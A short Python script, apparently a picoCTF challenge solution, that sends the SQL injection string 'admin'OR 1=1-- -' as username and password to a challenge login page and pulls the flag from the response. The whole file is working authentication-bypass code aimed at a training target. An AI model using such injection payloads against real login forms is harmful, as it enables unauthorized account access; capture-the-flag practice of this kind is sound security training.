#!/usr/bin/env python3

from pwn import *
import requests
import re

url = "https://jupiter.challenges.picoctf.org/problem/33850/"
s = requests.session()
log.progress("Wait until we get flag")
username = "admin'OR 1=1-- -"
password = "admin'OR 1=1-- -"
data = {'username' : username, 'password' : password}
context = s.post(url + "login.php", data=data).text
flag = re.findall("Your flag is: (.*)</p>", context)
flag = "".join(flag)
print("The flag is " + flag)
